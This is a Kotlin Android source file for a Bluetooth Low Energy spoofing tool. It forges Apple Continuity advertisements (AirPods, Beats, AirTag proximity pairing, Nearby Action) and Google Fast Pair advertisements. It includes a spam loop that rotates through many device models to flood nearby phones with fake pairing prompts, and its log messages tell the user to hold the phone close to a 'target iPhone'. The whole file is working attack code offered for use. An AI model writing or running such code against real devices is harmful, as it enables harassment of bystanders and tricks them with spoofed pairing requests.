package com.bletoy.spoof

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSet
import android.bluetooth.le.AdvertisingSetCallback
import android.bluetooth.le.AdvertisingSetParameters
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.Build
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow

enum class LogType { INFO, SUCCESS, ERROR, SEND, RECV }

data class LogEntry(
    val timestamp: Long = System.currentTimeMillis(),
    val type: LogType,
    val message: String
)

@SuppressLint("MissingPermission")
class BleManager(private val context: Context) {

    private val adapter: BluetoothAdapter? =
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter

    private val _log = MutableStateFlow<List<LogEntry>>(emptyList())
    val log: StateFlow<List<LogEntry>> = _log

    fun log(type: LogType, message: String) {
        val entry = LogEntry(type = type, message = message)
        _log.value = _log.value + entry
    }

    fun clearLog() {
        _log.value = emptyList()
    }

    var spoofDevices: List<SpoofDevice> = emptyList()
        private set
    private var advTemplates: Map<String, AdvTemplate> = emptyMap()

    fun loadConfigs(ctx: Context) {
        val manufacturers = DeviceProfiles.loadManufacturers(ctx)
        spoofDevices = DeviceProfiles.loadSpoofDevices(ctx)
        advTemplates = DeviceProfiles.loadAdvTemplates(ctx)
        log(LogType.INFO, "${manufacturers.size} manufacturers, ${spoofDevices.size} spoof devices, ${advTemplates.size} adv templates loaded")
    }

    // ══════════════════════════════════════════
    // BLE Advertisement Spoofing
    // ══════════════════════════════════════════

    private val _isSpoofing = MutableStateFlow(false)
    val isSpoofing: StateFlow<Boolean> = _isSpoofing

    private val _spoofTarget = MutableStateFlow("")
    val spoofTarget: StateFlow<String> = _spoofTarget

    private val _isSpamming = MutableStateFlow(false)
    val isSpamming: StateFlow<Boolean> = _isSpamming

    private var spamThread: Thread? = null
    @Volatile private var spamRunning = false

    private var advertiser: BluetoothLeAdvertiser? = null
    private val activeAdvertiseCallbacks = mutableListOf<AdvertiseCallback>()

    fun dryRunSpoof(device: SpoofDevice) {
        log(LogType.INFO, "[TEST] ── Dry-run for: ${device.name} (${device.category}) ──")

        if (adapter == null || !adapter.isEnabled) {
            log(LogType.ERROR, "[TEST] Bluetooth OFF or unavailable")
            return
        }
        val adv = adapter.bluetoothLeAdvertiser
        if (adv == null) {
            log(LogType.ERROR, "[TEST] BLE Advertiser not supported (hardware)")
            return
        }
        log(LogType.SUCCESS, "[TEST] Adapter OK, advertiser available")

        val multiAdv = adapter.isMultipleAdvertisementSupported
        val extAdv = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) adapter.isLeExtendedAdvertisingSupported else false
        val maxAdvLen = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && extAdv) {
            try { adapter.leMaximumAdvertisingDataLength } catch (_: Exception) { -1 }
        } else 31
        log(LogType.INFO, "[TEST] HW: multiAdv=$multiAdv extAdv=$extAdv maxAdvData=${maxAdvLen}B")

        when (device.category) {
            "apple_action" -> {
                val tmpl = advTemplates["apple_action"]
                val headerBytes = tmpl?.payload_header?.let { hexToBytes(it) } ?: byteArrayOf()
                val payload = headerBytes + byteArrayOf(device.modelId[0]) + ByteArray(tmpl?.random_len ?: 3)
                val totalSize = payload.size + 4 + 3
                log(LogType.SUCCESS, "[TEST] Nearby Action — payload ${payload.size}B, total ~${totalSize}B")
                log(LogType.SUCCESS, "[TEST] FITS in legacy 31B adv (${totalSize}/31)")
                log(LogType.INFO, "[TEST] Payload: ${formatBytes(payload)}")
            }
            "apple" -> {
                val tmpl = advTemplates["apple_pairing"]
                val random = java.security.SecureRandom()
                val airtgCheck = tmpl?.airtag_model_check?.let { hexToByte(it) } ?: 0x55.toByte()
                val isAirTag = device.modelId[1] == airtgCheck
                val prefix: Byte = if (isAirTag)
                    (tmpl?.prefix_airtag?.let { hexToByte(it) } ?: 0x05.toByte())
                else
                    (tmpl?.prefix_normal?.let { hexToByte(it) } ?: 0x07.toByte())
                val contType = tmpl?.continuity_type?.let { hexToByte(it) } ?: 0x07.toByte()
                val fullLen = (tmpl?.full_payload_len ?: 25).toByte()
                val trimLen = (tmpl?.trim_payload_len ?: 7).toByte()
                val statusByte = tmpl?.status?.let { hexToByte(it) } ?: 0x55.toByte()
                val lidByte = tmpl?.lid_open?.let { hexToByte(it) } ?: 0x01.toByte()
                val encLen = tmpl?.encrypted_len ?: 16
                val padBytes = tmpl?.pad?.let { hexToBytes(it) } ?: byteArrayOf(0x00, 0x00)

                val encrypted = ByteArray(encLen).also { random.nextBytes(it) }
                val fullPayload = byteArrayOf(
                    contType, fullLen, prefix,
                    device.modelId[0], device.modelId[1],
                    statusByte, 0x11, lidByte, 0x33
                ) + encrypted + padBytes
                val fullTotal = fullPayload.size + 4

                val trimPayload = byteArrayOf(
                    contType, trimLen, prefix,
                    device.modelId[0], device.modelId[1],
                    statusByte, 0x11, 0x22, 0x33
                )
                val trimTotal = trimPayload.size + 4 + 3

                log(LogType.INFO, "[TEST] ── Proximity Pairing Analysis ──")
                log(LogType.INFO, "[TEST] Full payload: ${fullPayload.size}B + header → ~${fullTotal}B needed")
                log(LogType.INFO, "[TEST] Trimmed payload: ${trimPayload.size}B + header → ~${trimTotal}B needed")

                if (extAdv) {
                    log(LogType.SUCCESS, "[TEST] BLE 5 Extended: FULL payload ${fullPayload.size}B FITS (max ${maxAdvLen}B)")
                    log(LogType.INFO, "[TEST] Strategy: setLegacyMode(false), full 27B payload")
                    log(LogType.INFO, "[TEST] Full: ${formatBytes(fullPayload)}")
                } else {
                    log(LogType.ERROR, "[TEST] BLE 5 Extended: NOT SUPPORTED on this device")
                    if (fullTotal <= 31) {
                        log(LogType.SUCCESS, "[TEST] Full payload fits in legacy! (${fullTotal}/31)")
                    } else {
                        log(LogType.ERROR, "[TEST] Full payload TOO LARGE for legacy (${fullTotal}/31)")
                        log(LogType.INFO, "[TEST] Overflow: ${fullTotal - 31}B over limit")
                    }
                }

                log(LogType.INFO, "[TEST] ──────────────────────")
                if (trimTotal <= 31) {
                    log(LogType.SUCCESS, "[TEST] Trimmed payload: FITS in legacy (${trimTotal}/31)")
                } else {
                    log(LogType.ERROR, "[TEST] Trimmed payload: TOO LARGE (${trimTotal}/31)")
                }
                log(LogType.INFO, "[TEST] Trimmed: ${formatBytes(trimPayload)}")

                log(LogType.INFO, "[TEST] ── VERDICT ──")
                if (extAdv) {
                    log(LogType.SUCCESS, "[TEST] WILL USE: BLE 5 Extended with full ${fullPayload.size}B payload")
                } else {
                    log(LogType.INFO, "[TEST] WILL USE: Legacy adv with trimmed ${trimPayload.size}B payload")
                    log(LogType.INFO, "[TEST] Note: trimmed payload may work on some iOS versions (type+model checked, padding optional)")
                }
            }
            "google" -> {
                val payload = device.modelId
                val totalSize = payload.size + 4 + 3
                log(LogType.SUCCESS, "[TEST] Google Fast Pair — payload ${payload.size}B, total ~${totalSize}B")
                log(LogType.SUCCESS, "[TEST] FITS in legacy 31B adv (${totalSize}/31)")
                log(LogType.INFO, "[TEST] Payload: ${formatBytes(payload)}")
            }
        }
        log(LogType.INFO, "[TEST] ── End dry-run (nothing was transmitted) ──")
    }

    fun startSpoof(device: SpoofDevice) {
        if (adapter == null || !adapter.isEnabled) {
            log(LogType.ERROR, "Bluetooth not available")
            return
        }
        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            log(LogType.ERROR, "BLE Advertiser not supported on this device")
            return
        }

        stopSpoof()

        _spoofTarget.value = device.name
        _isSpoofing.value = true
        log(LogType.INFO, "[SPOOF] Starting ${device.category.uppercase()}: ${device.name}")

        when (device.category) {
            "apple" -> startAppleSpoof(device)
            "apple_action" -> startAppleActionSpoof(device)
            "google" -> startGoogleSpoof(device)
        }
    }

    private fun startAppleActionSpoof(device: SpoofDevice) {
        val tmpl = advTemplates["apple_action"]
        if (tmpl == null) { log(LogType.ERROR, "[SPOOF] No apple_action template"); return }

        val random = java.security.SecureRandom()
        val headerBytes = hexToBytes(tmpl.payload_header ?: return)
        val authTag = ByteArray(tmpl.random_len).also { random.nextBytes(it) }
        val actionType = device.modelId[0]
        val companyId = tmpl.company_id?.toInt(16) ?: return

        val payload = headerBytes + byteArrayOf(actionType) + authTag

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setConnectable(tmpl.connectable)
            .setTimeout(0)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .build()

        val data = AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .addManufacturerData(companyId, payload)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                log(LogType.SUCCESS, "[SPOOF] Broadcasting ${device.name} (Nearby Action)")
                log(LogType.INFO, "[SPOOF] Action: 0x${"%02X".format(actionType)}, Payload: ${formatBytes(payload)}")
            }
            override fun onStartFailure(errorCode: Int) {
                val reason = when (errorCode) {
                    1 -> "DATA_TOO_LARGE"; 2 -> "TOO_MANY_ADVERTISERS"
                    3 -> "ALREADY_STARTED"; 4 -> "INTERNAL_ERROR"
                    5 -> "FEATURE_UNSUPPORTED"; else -> "UNKNOWN"
                }
                log(LogType.ERROR, "[SPOOF] Failed: $reason ($errorCode)")
                _isSpoofing.value = false
            }
        }
        activeAdvertiseCallbacks.add(callback)
        advertiser?.startAdvertising(settings, data, callback)
    }

    private fun startAppleSpoof(device: SpoofDevice) {
        val tmpl = advTemplates["apple_pairing"]
        if (tmpl == null) { log(LogType.ERROR, "[SPOOF] No apple_pairing template"); return }

        val random = java.security.SecureRandom()
        val companyId = tmpl.company_id?.toInt(16) ?: return
        val contType = hexToByte(tmpl.continuity_type ?: return)
        val fullLen = (tmpl.full_payload_len).toByte()
        val trimLen = (tmpl.trim_payload_len).toByte()
        val prefNormal = hexToByte(tmpl.prefix_normal ?: return)
        val prefAirtag = hexToByte(tmpl.prefix_airtag ?: return)
        val airtgCheck = hexToByte(tmpl.airtag_model_check ?: return)
        val statusByte = hexToByte(tmpl.status ?: return)
        val lidByte = hexToByte(tmpl.lid_open ?: return)
        val padBytes = hexToBytes(tmpl.pad ?: "0000")

        val isAirTag = device.modelId[1] == airtgCheck
        val prefix: Byte = if (isAirTag) prefAirtag else prefNormal

        val encrypted = ByteArray(tmpl.encrypted_len).also { random.nextBytes(it) }
        val fullPayload = byteArrayOf(
            contType, fullLen,
            prefix,
            device.modelId[0], device.modelId[1],
            statusByte,
            ((random.nextInt(10) shl 4) + random.nextInt(10)).toByte(),
            lidByte,
            random.nextInt(256).toByte()
        ) + encrypted + padBytes

        val trimPayload = byteArrayOf(
            contType, trimLen,
            prefix,
            device.modelId[0], device.modelId[1],
            statusByte,
            ((random.nextInt(10) shl 4) + random.nextInt(10)).toByte(),
            lidByte,
            random.nextInt(256).toByte()
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val advParams = AdvertisingSetParameters.Builder()
                    .setLegacyMode(true)
                    .setConnectable(false)
                    .setScannable(true)
                    .setInterval(AdvertisingSetParameters.INTERVAL_LOW)
                    .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_HIGH)
                    .build()

                val advData = AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addManufacturerData(companyId, fullPayload)
                    .build()

                val scanRsp = AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(true)
                    .build()

                val advSetCallback = object : AdvertisingSetCallback() {
                    override fun onAdvertisingSetStarted(advertisingSet: AdvertisingSet?, txPower: Int, status: Int) {
                        if (status == ADVERTISE_SUCCESS) {
                            log(LogType.SUCCESS, "[SPOOF] Broadcasting ${device.name} (ADV_SCAN_IND)")
                            log(LogType.INFO, "[SPOOF] Payload (${fullPayload.size}B) + TX Power in scan response")
                            log(LogType.INFO, "[SPOOF] Hold phone within 15cm of target iPhone!")
                        } else {
                            log(LogType.ERROR, "[SPOOF] ADV_SCAN_IND failed (status=$status), trying fallback...")
                            startAppleSpoofLegacyFallback(device, companyId, trimPayload)
                        }
                    }
                    override fun onAdvertisingSetStopped(advertisingSet: AdvertisingSet?) {}
                }

                advertiser?.startAdvertisingSet(advParams, advData, scanRsp, null, null, advSetCallback)
                return
            } catch (_: Exception) {
                // fall through to legacy
            }
        }

        startAppleSpoofLegacyFallback(device, companyId, trimPayload)
    }

    private fun startAppleSpoofLegacyFallback(device: SpoofDevice, companyId: Int, trimPayload: ByteArray) {
        log(LogType.INFO, "[SPOOF] Using legacy API with trimmed payload (${trimPayload.size}B)")

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setConnectable(false)
            .setTimeout(0)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .build()

        val advData = AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .addManufacturerData(companyId, trimPayload)
            .build()

        val scanResponse = AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(true)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                log(LogType.SUCCESS, "[SPOOF] Broadcasting ${device.name} (legacy + TX Power)")
                log(LogType.INFO, "[SPOOF] Hold phone within 15cm of target iPhone!")
            }
            override fun onStartFailure(errorCode: Int) {
                val reason = when (errorCode) {
                    1 -> "DATA_TOO_LARGE"; 2 -> "TOO_MANY_ADVERTISERS"
                    3 -> "ALREADY_STARTED"; 4 -> "INTERNAL_ERROR"
                    5 -> "FEATURE_UNSUPPORTED"; else -> "UNKNOWN"
                }
                log(LogType.ERROR, "[SPOOF] Legacy fallback failed: $reason ($errorCode)")
                _isSpoofing.value = false
            }
        }
        activeAdvertiseCallbacks.add(callback)
        advertiser?.startAdvertising(settings, advData, scanResponse, callback)
    }

    private fun startGoogleSpoof(device: SpoofDevice) {
        val tmpl = advTemplates["google_fastpair"]
        if (tmpl == null) { log(LogType.ERROR, "[SPOOF] No google_fastpair template"); return }

        val payload = device.modelId
        startFastPairAdvertising(payload, device, tmpl)
    }

    private fun startFastPairAdvertising(modelId: ByteArray, device: SpoofDevice, tmpl: AdvTemplate) {
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setConnectable(tmpl.connectable)
            .setTimeout(0)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .build()

        val fastPairUuid = android.os.ParcelUuid.fromString(tmpl.service_uuid ?: return)

        val data = AdvertiseData.Builder()
            .addServiceUuid(fastPairUuid)
            .addServiceData(fastPairUuid, modelId)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                log(LogType.SUCCESS, "[SPOOF] Broadcasting ${device.name} (Fast Pair)")
                log(LogType.INFO, "[SPOOF] Model ID: ${formatBytes(modelId)}")
            }
            override fun onStartFailure(errorCode: Int) {
                val reason = when (errorCode) {
                    1 -> "DATA_TOO_LARGE"
                    2 -> "TOO_MANY_ADVERTISERS"
                    3 -> "ALREADY_STARTED"
                    4 -> "INTERNAL_ERROR"
                    5 -> "FEATURE_UNSUPPORTED"
                    else -> "UNKNOWN"
                }
                log(LogType.ERROR, "[SPOOF] Failed: $reason ($errorCode)")
                _isSpoofing.value = false
            }
        }
        activeAdvertiseCallbacks.add(callback)
        advertiser?.startAdvertising(settings, data, callback)
    }

    fun startSpam(category: String) {
        val devices = spoofDevices.filter { it.category == category }
        if (devices.isEmpty()) return

        if (adapter == null || !adapter.isEnabled) {
            log(LogType.ERROR, "Bluetooth not available")
            return
        }
        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            log(LogType.ERROR, "BLE Advertiser not supported")
            return
        }

        stopSpoof()

        val label = if (category == "apple") "AirPods/Beats" else "Fast Pair"
        val intervalMs = if (category == "apple") 4000L else 3000L

        _isSpoofing.value = true
        _isSpamming.value = true
        _spoofTarget.value = "SPAM $label (${devices.size} models)"
        log(LogType.INFO, "[SPAM] Starting $label rotation — ${devices.size} models, ${intervalMs / 1000}s interval")

        spamRunning = true
        spamThread = Thread {
            var index = 0
            while (spamRunning) {
                val device = devices[index % devices.size]
                synchronized(activeAdvertiseCallbacks) {
                    for (cb in activeAdvertiseCallbacks) {
                        try { advertiser?.stopAdvertising(cb) } catch (_: Exception) {}
                    }
                    activeAdvertiseCallbacks.clear()
                }

                _spoofTarget.value = "SPAM $label [${index % devices.size + 1}/${devices.size}] ${device.name}"

                when (device.category) {
                    "apple" -> startAppleSpoof(device)
                    "google" -> startGoogleSpoof(device)
                }

                index++

                var slept = 0L
                while (spamRunning && slept < intervalMs) {
                    Thread.sleep(100)
                    slept += 100
                }
            }
        }.also { it.isDaemon = true; it.start() }
    }

    fun stopSpoof() {
        spamRunning = false
        spamThread?.let {
            try { it.join(500) } catch (_: Exception) {}
        }
        spamThread = null

        for (cb in activeAdvertiseCallbacks) {
            try { advertiser?.stopAdvertising(cb) } catch (_: Exception) {}
        }
        activeAdvertiseCallbacks.clear()
        if (_isSpoofing.value) {
            log(LogType.INFO, "[SPOOF] Stopped")
        }
        _isSpoofing.value = false
        _isSpamming.value = false
        _spoofTarget.value = ""
    }

    private fun hexToByte(hex: String): Byte = hex.toInt(16).toByte()
    private fun hexToBytes(hex: String): ByteArray =
        hex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()

    companion object {
        fun formatBytes(data: ByteArray): String {
            val hex = data.joinToString(" ") { "%02x".format(it) }
            val ascii = String(data, Charsets.UTF_8).replace(Regex("[^\\x20-\\x7E]"), ".")
            return if (ascii.any { it != '.' }) "$hex | $ascii" else hex
        }
    }
}
